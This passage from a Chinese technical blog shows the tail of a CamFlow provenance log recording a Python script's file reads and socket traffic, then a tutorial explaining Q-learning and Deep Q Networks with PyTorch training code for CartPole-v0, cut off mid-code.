class="line">			&quot;cf:pathname&quot;: &quot;&#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;A&#x2F;b.txt&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[path] &#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;A&#x2F;b.txt&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AABAAAAAACSH6fP&#x2F;+sAVIigAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;2456081356069005703&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;path&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963338&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:pathname&quot;: &quot;&#x2F;root&#x2F;usr&#x2F;lib64&#x2F;python3.9&#x2F;encodings&#x2F;idna.py&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[path] &#x2F;root&#x2F;usr&#x2F;lib64&#x2F;python3.9&#x2F;encodings&#x2F;idna.py&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AABAAAAAACRe0ES5WgG5ASgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;124131953896378462&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;path&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963338&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:pathname&quot;: &quot;&#x2F;root&#x2F;usr&#x2F;lib64&#x2F;python3.9&#x2F;encodings&#x2F;__pycache__&#x2F;idna.cpython-39.pyc&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[path] &#x2F;root&#x2F;usr&#x2F;lib64&#x2F;python3.9&#x2F;encodings&#x2F;__pycache__&#x2F;idna.cpython-39.pyc&quot;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;used&quot;: &#123;</span><br><span class="line">		&quot;cf:BAAAAAAAIIDsAAAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;236&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;memory_read&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963341&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;memory_read&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:entity&quot;: &quot;cf:AAAIAAAAACA8JgIAAAAAACgAAACkyYgGFAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEA7JgIAAAAAACgAAACkyYgGIAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;140859&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AgAAAAAAIID1AAAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;245&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;read_ioctl&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963379&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;read_ioctl&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:entity&quot;: &quot;cf:ACAAAAAAACCALgIAAAAAACgAAACkyYgGAQAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEA7JgIAAAAAACgAAACkyYgGIQAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;140859&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:gAAAAAAAIIAjAQAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;291&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;open&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963462&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;open&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:entity&quot;: &quot;cf:AAEAAAAAACBDxgAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:activity&quot;: &quot;cf:AQAAAAAAAECDLgIAAAAAACgAAACkyYgGAQAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;142979&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AAgAAAAAIIAkAQAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;292&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;getattr&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963462&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;getattr&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:entity&quot;: &quot;cf:AAEAAAAAACBDxgAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:activity&quot;: &quot;cf:AQAAAAAAAECDLgIAAAAAACgAAACkyYgGAQAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;142979&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AQAAAAAAIIApAQAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;297&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;read&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963462&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;read&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:entity&quot;: &quot;cf:AAEAAAAAACBSxgAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:activity&quot;: &quot;cf:AQAAAAAAAECDLgIAAAAAACgAAACkyYgGAQAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;4&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;142979&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;wasGeneratedBy&quot;: &#123;</span><br><span class="line">		&quot;cf:BAAAAAAAQIDtAAAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;237&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;socket_create&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963341&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;socket_create&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEA7JgIAAAAAACgAAACkyYgGIAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:entity&quot;: &quot;cf:ACAAAAAAACCALgIAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;140859&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AAEAAAAAQIDvAAAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;239&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;connect&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963341&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;connect&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEA7JgIAAAAAACgAAACkyYgGIAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:entity&quot;: &quot;cf:ACAAAAAAACCALgIAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;140859&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:QAAAAAAAQIDzAAAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;243&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;write_ioctl&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963379&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;write_ioctl&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEA7JgIAAAAAACgAAACkyYgGIAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:entity&quot;: &quot;cf:ACAAAAAAACCALgIAAAAAACgAAACkyYgGAQAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;140859&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:gAAAAAAAQID3AAAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;247&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;memory_write&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963379&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;memory_write&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEA7JgIAAAAAACgAAACkyYgGIQAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:entity&quot;: &quot;cf:AAAIAAAAACA8JgIAAAAAACgAAACkyYgGFQAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;140859&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:ACAAAAAAQIBFAQAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;325&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;send_msg&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963506&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;send_msg&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEA7JgIAAAAAACgAAACkyYgGIgAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:entity&quot;: &quot;cf:ACAAAAAAACCALgIAAAAAACgAAACkyYgGCgAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;140859&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;wasDerivedFrom&quot;: &#123;</span><br><span class="line">		&quot;cf:AAABAAAAgIDrAAAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;235&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;sh_read&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963341&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;sh_read&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:usedEntity&quot;: &quot;cf:AAEAAAAAACCB0gAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:generatedEntity&quot;: &quot;cf:AAAIAAAAACA8JgIAAAAAACgAAACkyYgGFAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;80000d1&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;140859&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AAAIAAAAgIDuAAAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;238&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;addressed&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963341&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;addressed&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:usedEntity&quot;: &quot;cf:AAAgAAAAACSBLgIAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:generatedEntity&quot;: &quot;cf:ACAAAAAAACCALgIAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;140859&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:BAAAAAAAgIDwAAAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;240&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;send_packet&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963341&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;send_packet&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:usedEntity&quot;: &quot;cf:ACAAAAAAACCALgIAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:generatedEntity&quot;: &quot;cf:AAACAAAAACAVIQAAwKi3gi9dKpaxXAAWBgAAAGi29KA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;140859&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:BAAAAAAAgIBpAQAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;361&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;send_packet&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963941&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;send_packet&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:usedEntity&quot;: &quot;cf:ACAAAAAAACCALgIAAAAAACgAAACkyYgGDwAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:generatedEntity&quot;: &quot;cf:AAACAAAAACAVMQAAwKi3gi9dKpaxXAAWBgAAAGi2+bk&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;140859&quot;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
顶点属性包括socket,packet,file,path等，边属性包括open,read,connect,send_msg,send_packet等，可以得出使用python (python3.9)本对目录文件进行遍历操作，并与服务器进行socket通信，可视化结果如下(将cc9.json导入<a href="https://camflow.org/demo">可视化平台</a>)：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210202164630.png" alt="20210202164630"></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>系统监控</tag>
      </tags>
  </entry>
  <entry>
    <title>Deep Q Network(DQN)在CartPole-v0上的应用</title>
    <url>/2021/12/07/dqn-CartPole-v0/</url>
    <content><![CDATA[<p><strong>如今, 随着机器学习在日常生活中的各种应用, 各种机器学习方法也在融汇, 合并, 升级. 而我们今天所要探讨的强化学习则是这么一种融合了神经网络和 Q learning 的方法, 名字叫做 Deep Q Network. 这种新型结构是为什么被提出来呢? 原来, 传统的表格形式的强化学习有这样一个瓶颈。</strong></p>
<a id="more"></a>
<h2 id="QLearning"><a href="#QLearning" class="headerlink" title="QLearning"></a>QLearning</h2><p>QLearning是强化学习算法中value-based的算法，Q即为Q（s,a）就是在某一时刻的 s 状态下(s∈S)，采取 动作a (a∈A)动作能够获得收益的期望，环境会根据agent的动作反馈相应的回报reward r，所以算法的主要思想就是将State与Action构建成一张Q-table来存储Q值，然后根据Q值来选取能够获得最大的收益的动作。</p>
<table>
<thead>
<tr>
<th align="right">Q-Table</th>
<th align="right">a1</th>
<th align="right">a2</th>
</tr>
</thead>
<tbody><tr>
<td align="right">s1</td>
<td align="right">q(s1,a1)</td>
<td align="right">q(s1,a2)</td>
</tr>
<tr>
<td align="right">s2</td>
<td align="right">q(s2,a1)</td>
<td align="right">q(s2,a2)</td>
</tr>
<tr>
<td align="right">s3</td>
<td align="right">q(s3,a1)</td>
<td align="right">q(s3,a2)</td>
</tr>
</tbody></table>
<p>Qlearning的主要优势就是使用了时间差分法TD（融合了蒙特卡洛和动态规划）能够进行离线学习, 使用bellman方程可以对马尔科夫过程求解最优策略。<br>Q(s,a)状态动作值函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20211207150858.png" alt="20211207150858"></p>
<p>其中Gt是从t时刻开始的总折扣奖励，从这里我们能看出来 γ衰变值对Q函数的影响，γ越接近于1代表它越有远见会着重考虑后续状态的的价值，当γ接近0的时候就会变得近视只考虑当前的利益的影响。所以从0到1，算法就会越来越会考虑后续回报的影响。</p>
<hr>
<h2 id="为什么使用神经网络-为什么提出DQN"><a href="#为什么使用神经网络-为什么提出DQN" class="headerlink" title="为什么使用神经网络(为什么提出DQN)"></a>为什么使用神经网络(为什么提出DQN)</h2><p>我们使用表格来存储每一个状态 state, 和在这个 state 每个行为 action 所拥有的 Q 值. 而当今问题是在太复杂, 状态可以多到比天上的星星还多(比如下围棋). 如果全用表格来存储它们, 恐怕我们的计算机有再大的内存都不够, 而且每次在这么大的表格中搜索对应的状态也是一件很耗时的事. 不过, 在机器学习中, 有一种方法对这种事情很在行, 那就是神经网络. 我们可以将状态和动作当成神经网络的输入, 然后经过神经网络分析后得到动作的 Q 值, 这样我们就没必要在表格中记录 Q 值, 而是直接使用神经网络生成 Q 值. 还有一种形式的是这样, 我们也能只输入状态值, 输出所有的动作值, 然后按照 Q learning 的原则, 直接选择拥有最大值的动作当做下一步要做的动作. 我们可以想象, 神经网络接受外部的信息, 相当于眼睛鼻子耳朵收集信息, 然后通过大脑加工输出每种动作的值, 最后通过强化学习的方式选择动作.</p>
<hr>
<h2 id="如何更新神经网络"><a href="#如何更新神经网络" class="headerlink" title="如何更新神经网络"></a>如何更新神经网络</h2><p>接下来我们基于第二种神经网络来分析, 我们知道, 神经网络是要被训练才能预测出准确的值. 那在强化学习中, 神经网络是如何被训练的呢? 首先, 我们需要 a1, a2 正确的Q值, 这个 Q 值我们就用之前在 Q learning 中的 Q 现实来代替. 同样我们还需要一个 Q 估计 来实现神经网络的更新. 所以神经网络的的参数就是老的 NN 参数 加学习率 alpha 乘以 Q 现实 和 Q 估计 的差距. 我们整理一下.</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20211207151445.png" alt="20211207151445"></p>
<p>我们通过 NN 预测出Q(s2, a1) 和 Q(s2,a2) 的值, 这就是 Q 估计. 然后我们选取 Q 估计中最大值的动作来换取环境中的奖励 reward. 而 Q 现实中也包含从神经网络分析出来的两个 Q 估计值, 不过这个 Q 估计是针对于下一步在 s’ 的估计. 最后再通过刚刚所说的算法更新神经网络中的参数.</p>
<hr>
<h2 id="DQN在CartPole-v0上的应用"><a href="#DQN在CartPole-v0上的应用" class="headerlink" title="DQN在CartPole-v0上的应用"></a>DQN在CartPole-v0上的应用</h2><p>首先看模型未训练前效果：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn@master/vedio/20211208-202305.gif" alt="image"></p>
<p>对应的奖励如下所示，可以看到毫无policy可言，效果一塌糊涂：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reward_sum:3.27</span><br><span class="line">reward_sum:3.96</span><br><span class="line">reward_sum:1.72</span><br><span class="line">reward_sum:2.46</span><br><span class="line">reward_sum:2.01</span><br><span class="line">reward_sum:2.98</span><br><span class="line">reward_sum:3.74</span><br><span class="line">reward_sum:3.25</span><br><span class="line">reward_sum:2.85</span><br></pre></td></tr></table></figure>
<hr>
<p>为了改善这个情况，接下来需要训练模型。</p>
<p>训练模型：</p>
<p>依赖环境：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">torch&#x3D;&#x3D;1.9.0</span><br><span class="line">gym&#x3D;&#x3D;0.21.0</span><br><span class="line">numpy&#x3D;&#x3D;1.19.5</span><br></pre></td></tr></table></figure>
<p>main.py :（训练网络）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import torch                                    # 导入torch</span><br><span class="line">import torch.nn as nn                           # 导入torch.nn</span><br><span class="line">import torch.nn.functional as F                 # 导入torch.nn.functional</span><br><span class="line">import numpy as np                              # 导入numpy</span><br><span class="line">import gym                                      # 导入gym</span><br><span class="line"></span><br><span class="line"># 超参数</span><br><span class="line">BATCH_SIZE &#x3D; 32                                 # 样本数量</span><br><span class="line">LR &#x3D; 0.01                                       # 学习率</span><br><span class="line">EPSILON &#x3D; 0.9                                   # greedy policy</span><br><span class="line">GAMMA &#x3D; 0.9                                     # reward discount</span><br><span class="line">TARGET_REPLACE_ITER &#x3D; 100                       # 目标网络更新频率</span><br><span class="line">MEMORY_CAPACITY &#x3D; 2000                          # 记忆库容量</span><br><span class="line">env &#x3D; gym.make(&#39;CartPole-v0&#39;).unwrapped         # 使用gym库中的环境：CartPole，且打开封装(若想了解该环境，请自行百度)</span><br><span class="line">N_ACTIONS &#x3D; env.action_space.n                  # 杆子动作个数 (2个)</span><br><span class="line">N_STATES &#x3D; env.observation_space.shape[0]       # 杆子状态个数 (4个)</span><br><span class="line"></span><br><span class="line">#定义Net类（定义网络）</span><br><span class="line">class Net(nn.Module):</span><br><span class="line">    def __init__(self):                                                         </span><br><span class="line">        # nn.Module的子类函数必须在构造函数中执行父类的构造函数</span><br><span class="line">        super(Net, self).__init__()                                            </span><br><span class="line"></span><br><span class="line">        self.fc1 &#x3D; nn.Linear(N_STATES, 50)                                      </span><br><span class="line">        self.fc1.weight.data.normal_(0, 0.1)</span><br><span class="line">        self.fc2 &#x3D; nn.Linear(50, 50)                                      </span><br><span class="line">        self.fc2.weight.data.normal_(0, 0.1)</span><br><span class="line">        self.out &#x3D; nn.Linear(50, N_ACTIONS)                                     </span><br><span class="line">        self.out.weight.data.normal_(0, 0.1)                                   </span><br><span class="line">    def forward(self, x):                                                       </span><br><span class="line">        x &#x3D; F.relu(self.fc1(x))                                                 </span><br><span class="line">        x &#x3D; F.relu(self.fc2(x))</span><br><span class="line">        return self.out(x)                                                    </span><br><span class="line"></span><br><span class="line"># 定义DQN类 (定义两个网络)</span><br><span class="line">class DQN(object):</span><br><span class="line">    def __init__(self):                                                         # 定义DQN的一系列属性</span><br><span class="line">        self.eval_net, self.target_net &#x3D; Net(), Net()                           # 利用Net创建两个神经网络: 评估网络和目标网络</span><br><span class="line">        self.learn_step_counter &#x3D; 0                                             # for target updating</span><br><span class="line">        self.memory_counter &#x3D; 0                                                 # for storing memory</span><br><span class="line">        self.memory 